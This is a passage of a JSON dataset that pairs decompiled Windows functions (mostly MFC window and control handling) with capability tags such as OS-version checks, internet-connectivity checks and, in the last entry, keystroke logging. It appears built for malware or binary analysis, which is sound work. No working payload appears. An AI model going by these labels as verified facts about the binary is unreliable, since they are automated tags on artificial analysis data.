        "decompiled_code": "\nvoid __cdecl fcn.0040a7a6(uint noname_0, uint noname_1, uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    code *unaff_EBX;\n    uint var_4h;\n    int32_t iStack8;\n    \n    if (*(in_ECX + 0x74) != 0) {\n        iStack8 = in_ECX;\n        uVar1 = func_0x00483d31();\n        (*unaff_EBX)(uVar1);\n        iVar2 = func_0x0074a78a();\n        if ((iVar2 == 0) && (iVar2 = fcn.00429c9a(noname_0, &iStack8, 0),  iVar2 != 0)) {\n            if (*(in_ECX + 0x70) != 0) {\n                fcn.00409b98(*(in_ECX + 0x70));\n            }\n            uVar1 = fcn.00429c94(0, iStack8, noname_0, 0, 0, 0);\n            uVar1 = func_0x004424dc(uVar1, 0x42, uVar1);\n            *(in_ECX + 0x70) = uVar1;\n            uVar1 = (*unaff_EBX)(uVar1);\n            iVar2 = fcn.00429c94(0, iStack8, noname_0, uVar1, 0, 2);\n            if (iVar2 != 1) {\n                fcn.00409b98(*(in_ECX + 0x70));\n                *(in_ECX + 0x70) = 0;\n            }\n            fcn.00429c8e(iStack8);\n        }\n    }\n    return;\n}\n",
        "token_count": 410
    },
    "0040a846": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a846(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    \n    if ((arg_ch != 0) && (arg_10h != 0)) {\n        puVar2 = fcn.00405ac3(arg_ch * arg_10h + 4);\n        *puVar2 = *arg_8h;\n        *arg_8h = puVar2;\n        return;\n    }\n    fcn.00405f96();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 148
    },
    "0040a9c7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a9c7(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    code **ppcVar5;\n    int32_t *in_ECX;\n    int32_t *piVar6;\n    uint32_t arg_ch_00;\n    \n    if (arg_ch == 0xfffffffe) {\n        iVar1 = fcn.00407ce3();\n        if (*(iVar1 + 0x3c) != 0) goto code_r0x0040a9e7;\n    }\n    else {\n        if (arg_ch != 0xfffffffd) {\n            if (arg_ch != 0xffffffff) {\n                uVar4 = arg_ch & 0xffff;\n                arg_ch_00 = arg_ch >> 0x10;\n                arg_ch = uVar4;\n                if (arg_ch_00 != 0) goto code_r0x0040aa9f;\n            }\n            arg_ch_00 = 0x111;\ncode_r0x0040aa9f:\n            ppcVar5 = (**(*in_ECX + 0x28))();\n            while( true ) {\n                if (*ppcVar5 == NULL) {\n                    return 0;\n                }\n                iVar1 = fcn.0040bb22(ppcVar5[1], arg_ch_00, arg_ch, arg_8h);\n                if (iVar1 != 0) break;\n                ppcVar5 = (**ppcVar5)();\n            }\n            iVar1 = fcn.0040a88f(in_ECX, arg_8h, arg_ch, *(iVar1 + 0x14), arg_10h, *(iVar1 + 0x10), arg_14h);\n            return iVar1;\n        }\n        arg_ch = 0;\n        if (arg_10h != 0) {\n            iVar1 = *(arg_10h + 0x30);\n            puVar2 = (**(*in_ECX + 0x2c))();\n            do {\n                if (puVar2 == NULL) {\n                    return arg_ch;\n                }\n                if (arg_ch != 0) {\n                    return arg_ch;\n                }\n                piVar6 = puVar2[1];\n                while (((piVar6[1] != 0 && (piVar6[2] != 0)) && (arg_ch == 0))) {\n                    if (arg_8h == piVar6[1]) {\n                        if (iVar1 == 0) {\n                            if (*piVar6 == 0) {\ncode_r0x0040aa64:\n                                *(arg_10h + 4) = piVar6[2];\n                                arg_ch = 1;\n                            }\n                        }\n                        else if ((*piVar6 != 0) && (iVar3 = fcn.004070bd(iVar1, *piVar6),  iVar3 != 0))\n                        goto code_r0x0040aa64;\n                    }\n                    piVar6 = piVar6 + 3;\n                }\n                puVar2 = *puVar2;\n            } while( true );\n        }\n    }\n    fcn.00405f96();\ncode_r0x0040a9e7:\n    iVar1 = fcn.00407ce3();\n    iVar1 = (**(**(iVar1 + 0x3c) + 4))();\n    return iVar1;\n}\n",
        "token_count": 775
    },
    "0040af77": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040af77(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t *piVar3;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.004122ae(8);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if ((arg_8h_00 != 0) && (iVar1 = fcn.00409d7d(arg_8h_00),  iVar1 == 0)) {\n        iVar1 = fcn.00409d7d(arg_8h_00);\n        if (iVar1 == 0) {\n            uVar2 = fcn.00405aac(fcn.00409bd0);\n            *(unaff_EBP + -4) = 0;\n            *(unaff_EBP + 8) = uVar2;\n            iVar1 = fcn.00410835();\n            if (iVar1 == 0) {\n                fcn.00405f5e();\n            }\n            (**(extraout_ECX + 0x14))(iVar1);\n            piVar3 = fcn.00409f44(arg_8h_00);\n            uVar2 = *(unaff_EBP + 8);\n            *(unaff_EBP + -4) = 0xffffffff;\n            *piVar3 = iVar1;\n            fcn.00405aac(uVar2);\n            piVar3 = *(extraout_ECX + 0x58) + iVar1;\n            *piVar3 = arg_8h_00;\n            if (*(extraout_ECX + 0x5c) == 2) {\n                piVar3[1] = arg_8h_00;\n            }\n        }\n        else {\n            piVar3 = *(extraout_ECX + 0x58) + iVar1;\n            *piVar3 = arg_8h_00;\n            if (*(extraout_ECX + 0x5c) == 2) {\n                piVar3[1] = arg_8h_00;\n            }\n        }\n    }\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 514
    },
    "0040b02a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b02a(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (param_1 != 0) {\n        var_8h = -(*(param_1 + 0x44) != 0);\n        while (var_8h != 0) {\n            fcn.00409e33(&var_8h, &var_ch, &var_4h);\n            puVar1 = *(param_1 + 0x58) + var_4h;\n            *puVar1 = 0;\n            if (*(param_1 + 0x5c) == 2) {\n                puVar1[1] = 0;\n            }\n            (**(param_1 + 0x18))(var_4h);\n        }\n        fcn.00409cf7();\n        fcn.00410819();\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "0040b3a7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0040b3a7(uint32_t arg_8h, uint noname_1, uint noname_2, uint noname_3, uint arg_18h, uint32_t *arg_1ch, \n            uint *arg_20h, uint noname_7, uint *arg_28h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint var_48h;\n    int32_t aiStack72 [9];\n    uint var_20h;\n    uint var_10h;\n    \n    puVar3 = arg_1ch;\n    iVar6 = 0;\n    var_20h._0_2_ = 0;\n    if (arg_8h == 0) {\n        uVar4 = 0x80070057;\n    }\n    else if (arg_1ch == NULL) {\n        uVar4 = 0x80020008;\n    }\n    else {\n        uVar1 = arg_1ch[2];\n        if (uVar1 < 6) {\n            arg_8h = 0;\n            if (arg_1ch[3] != 0) {\n                arg_1ch = arg_1ch[1];\n                do {\n                    uVar2 = *arg_1ch;\n                    if (uVar1 <= uVar2) goto code_r0x0040b3e4;\n                    arg_1ch = arg_1ch + 1;\n                    arg_8h = arg_8h + 1;\n                    aiStack72[uVar2] = *puVar3 + iVar6;\n                    iVar6 = iVar6 + 0x10;\n                } while (arg_8h < puVar3[3]);\n            }\n            if (arg_8h < uVar1) {\n                iVar6 = arg_8h * 0x10 + *puVar3;\n                iVar5 = uVar1 - arg_8h;\n                piVar7 = aiStack72 + (uVar1 - arg_8h) + -1;\n                do {\n                    *piVar7 = iVar6;\n                    iVar6 = iVar6 + 0x10;\n                    piVar7 = piVar7 + -1;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n            if (arg_28h == NULL) {\n                arg_28h = &arg_18h;\n            }\n            if (arg_20h == NULL) {\n                arg_20h = &var_20h;\n            }\n            uVar4 = func_0x006d3e92(&var_10h);\n            return uVar4;\n        }\ncode_r0x0040b3e4:\n        uVar4 = 0x8002000e;\n    }\n    return uVar4;\n}\n",
        "token_count": 683
    },
    "0040bb22": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0040bb22(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    while( true ) {\n        if (arg_8h[4] == 0) {\n            return NULL;\n        }\n        if ((((arg_ch == *arg_8h) && (arg_10h == arg_8h[1])) && (arg_8h[2] <= arg_14h)) &&\n           (arg_14h < arg_8h[3] || arg_14h == arg_8h[3])) break;\n        arg_8h = arg_8h + 6;\n    }\n    return arg_8h;\n}\n",
        "token_count": 168
    },
    "0040c018": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040c018(void)\n\n{\n    uint uVar1;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = func_0x00592670();\n        }\n        fcn.00407550(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            func_0x005ee13c(extraout_ECX, uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "0040c408": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c408(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = fcn.00407d16();\n    if ((*(iVar4 + 0x3c) != 0) && (iVar1 = *(*(iVar4 + 0x3c) + 0x20),  iVar1 != 0)) {\n        func_0x0063c3f0(iVar1, iVar1, 0x401, 0, 0);\n    }\n    piVar2 = *(iVar4 + 0x50);\n    if ((arg_8h != 0) && (piVar2 != NULL)) {\n        iVar3 = func_0x004956b0(piVar2, 1);\n        if (-1 < iVar3) {\n            (**(*piVar2 + 0x178))(0xffffffff);\n        }\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "0040c555": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c555(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h == 0) {\n        iVar1 = fcn.00407d16();\n        if ((*(iVar1 + 0x48) != 0) && ((*(*(iVar1 + 0x48) + 4) & 0x40000000) == 0)) {\n            fcn.0040c408(1);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 115
    },
    "0040d1ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040d1ae(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 4) == 0) {\n        iVar1 = fcn.00615d31(param_2, *(param_1 + 0xc));\n        *(param_1 + 4) = iVar1;\n        if (iVar1 == 0) {\n            uVar2 = fcn.00576787(*(param_1 + 0xc));\n            return uVar2;\n        }\n    }\n    return *(param_1 + 4);\n}\n",
        "token_count": 142
    },
    "0040d1e2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d1e2(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x10) == 0) {\n        uVar1 = fcn.0040d1ae(\"InitCommonControls\");\n        fcn.00516a3b(uVar1);\n        return;\n    }\n    *arg_8h = *(in_ECX + 0x10);\n    return;\n}\n",
        "token_count": 110
    },
    "0040d274": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040d274(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x20) != 2) {\n        fcn.00407550(0, *(unaff_EBP + -0x1c));\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "0040d285": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d285(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x14) == 0) {\n        fcn.0040d1ae(\"InitCommonControlsEx\");\n        uVar1 = fcn.00725197();\n        *(in_ECX + 0x14) = uVar1;\n    }\n    *arg_8h = *(in_ECX + 0x14);\n    return;\n}\n",
        "token_count": 117
    },
    "0040d329": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040d329(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = func_0x0070c572();\n        }\n        fcn.00407550(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            func_0x006a3e07(uVar1);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "0040d3ef": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040d3ef(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.0041227b(0);\n    iVar1 = fcn.00407d16();\n    if ((*(iVar1 + 0x14) == 0) && (*(unaff_EBP + 8) != 0)) {\n        arg_8h_00 = fcn.00405aac(fcn.00409bd0);\n        iVar2 = fcn.00405ac3(0x60);\n        *(unaff_EBP + 8) = iVar2;\n        *(unaff_EBP + -4) = 0;\n        if (iVar2 == 0) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = fcn.0040aeee(0x42d298, 0x40d187, fcn.00410097, 0x20, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x14) = uVar3;\n        fcn.00405aac(arg_8h_00);\n    }\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 325
    },
    "0040d51c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0040d51c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.0040851e(0x405fb2);\n    if (iVar1 == 0) {\n        fcn.00405f96();\n    }\n    iVar2 = fcn.00407ce3();\n    if ((*(iVar2 + 0x14) != '\\0') && (iVar2 = *(iVar1 + 0x28),  iVar2 != 0)) {\n        func_0x007063c8(iVar2, iVar2);\n        *(iVar1 + 0x28) = 0;\n    }\n    if (*(iVar1 + 0x14) != 0) {\n        *(iVar1 + 0x14) = 0;\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 192
    },
    "0040d5a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040d5a6(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    \n    pcVar1 = fcn.0040a03c();\n    if (pcVar1 == NULL) goto code_r0x0040d5f3;\n    if (*(pcVar1 + 0x20) == param_1) {\n        iVar2 = fcn.00407ce3();\n        if (*(iVar2 + 0x14) == '\\0') {\n            iVar2 = fcn.00407ce3();\n            if (pcVar1 == *(iVar2 + 4)) {\n                iVar2 = fcn.00410752();\n                if (iVar2 == 0) goto code_r0x0040d5e8;\n            }\n            fcn.0040a784(0);\n        }\ncode_r0x0040d5e8:\n        *(pcVar1 + 0x20) = 0;\n    }\n    if (*(pcVar1 + 0x24) == param_1) {\n        *(pcVar1 + 0x24) = 0;\n    }\ncode_r0x0040d5f3:\n    if (param_1[0x12] != NULL) {\n        (**(*param_1[0x12] + 0x50))();\n        param_1[0x12] = 0;\n    }\n    if (param_1[0x13] != NULL) {\n        (**(*param_1[0x13] + 4))(1);\n    }\n    param_1[0x13] = 0;\n    if ((*(param_1 + 0xf) & 1) != 0) {\n        iVar2 = fcn.00407d16();\n        pcVar1 = *(iVar2 + 0x3c);\n        if ((pcVar1 != NULL) && (*(pcVar1 + 0x20) != 0)) {\n            fcn.00410fb0(&var_30h, 0, 0x30);\n            var_28h = param_1[8];\n            var_30h = 0x2c;\n            var_2ch = 1;\n            var_24h = var_28h;\n            func_0x0075ca10(*(pcVar1 + 0x20), 0x405, 0, &var_30h);\n            return;\n        }\n    }\n    uVar3 = func_0x005dacc3(param_1[8]);\n    iVar2 = (*pcVar1)(uVar3, 0xfffffffc);\n    fcn.0040d3bd();\n    iVar4 = (*pcVar1)(param_1[8], 0xfffffffc);\n    if (iVar4 == iVar2) {\n        piVar5 = (**(*param_1 + 0xf8))();\n        if (*piVar5 != 0) {\n            func_0x00550a9a(&stack0xfffffffc, param_1[8], 0xfffffffc, *piVar5);\n        }\n    }\n    fcn.0040d4ec();\n    (**(*param_1 + 0x11c))();\n    return;\n}\n",
        "token_count": 763
    },
    "0040d769": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d769(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *unaff_EDI;\n    \n    func_0x0071c302();\n    iVar1 = func_0x00628689();\n    if (iVar1 != 0) {\n        iVar2 = (*unaff_EDI)(iVar1);\n        if ((iVar2 != 0) && (iVar2 = fcn.0040d769(iVar1, arg_ch, arg_10h),  iVar2 != 0)) {\n            return;\n        }\n        if (arg_10h == 0) {\n            fcn.0040d463(iVar1);\n            return;\n        }\n        iVar1 = fcn.0040d48f();\n        if (iVar1 != 0) {\n            return;\n        }\n    }\n    iVar1 = (*unaff_EDI)(arg_8h);\n    if ((iVar1 != 0) && (iVar2 = fcn.0040d769(iVar1, arg_ch, arg_10h),  iVar2 == 0)) {\n        func_0x006028b2(iVar1, 2);\n        return;\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "0040d8ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0040d8ae(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    if (*(in_ECX + 9) != '\\0') {\n        var_4h = NULL;\n        iVar2 = (**(*in_ECX + 0xec))(arg_8h, arg_ch, &var_4h);\n        if (-1 < iVar2) {\n            return var_4h;\n        }\n    }\n    piVar1 = fcn.0040d3bd();\n    return piVar1;\n}\n",
        "token_count": 164
    },
    "0040da61": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.0040da61(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t extraout_EDX;\n    int32_t unaff_EBP;\n    uint *puVar5;\n    uint *puVar6;\n    uint var_44h;\n    uint var_28h;\n    uint var_18h;\n    uint var_4h;\n    \n    fcn.004122ae(0x38);\n    iVar1 = fcn.0040851e(0x405fb2);\n    iVar4 = 0;\n    *(unaff_EBP + -0x18) = iVar1;\n    if (iVar1 == 0) {\n        fcn.00405f96();\n        iVar4 = extraout_EDX;\n    }\n    puVar5 = iVar1 + 0x58;\n    puVar6 = unaff_EBP + -0x44;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    iVar3 = *(unaff_EBP + 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(iVar1 + 0x58) = *(unaff_EBP + 0xc);\n    *(iVar1 + 0x60) = *(unaff_EBP + 0x14);\n    uVar2 = *(unaff_EBP + 0x18);\n    *(iVar1 + 0x5c) = iVar3;\n    *(iVar1 + 100) = uVar2;\n    *(unaff_EBP + -4) = iVar4;\n    if ((iVar3 == 2) && (arg_8h_00[0x13] != iVar4)) {\n        (**(*arg_8h_00[0x13] + 0x60))(iVar4);\n    }\n    *(unaff_EBP + 8) = 0;\n    if (iVar3 == 0x110) {\n        fcn.0040c32f(arg_8h_00, unaff_EBP + -0x28, unaff_EBP + 8);\n    }\n    uVar2 = (**(*arg_8h_00 + 0x110))(iVar3, *(unaff_EBP + 0x14), *(unaff_EBP + 0x18));\n    *(unaff_EBP + 0x18) = uVar2;\n    if (iVar3 == 0x110) {\n        fcn.0040d9eb(arg_8h_00, unaff_EBP + -0x28, *(unaff_EBP + 8));\n    }\n    puVar5 = unaff_EBP + -0x44;\n    puVar6 = iVar1 + 0x58;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 804
    },
    "0040dba1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0040dba1(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041227b(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWnd.0;\n    *(unaff_EBP + -4) = 0;\n    if ((((extraout_ECX[8] != NULL) && (extraout_ECX != 0x438e40)) && (extraout_ECX != 0x438e98)) &&\n       ((extraout_ECX != 0x438ef0 && (extraout_ECX != 0x438f48)))) {\n        fcn.0040d6b9();\n    }\n    if (extraout_ECX[0x13] != NULL) {\n        (**(*extraout_ECX[0x13] + 4))(1);\n    }\n    pcVar1 = extraout_ECX[0x14];\n    if ((pcVar1 != NULL) && (*(pcVar1 + 0x28) == extraout_ECX)) {\n        *(pcVar1 + 0x28) = 0;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040abb2();\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 337
    },
    "0040dc43": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
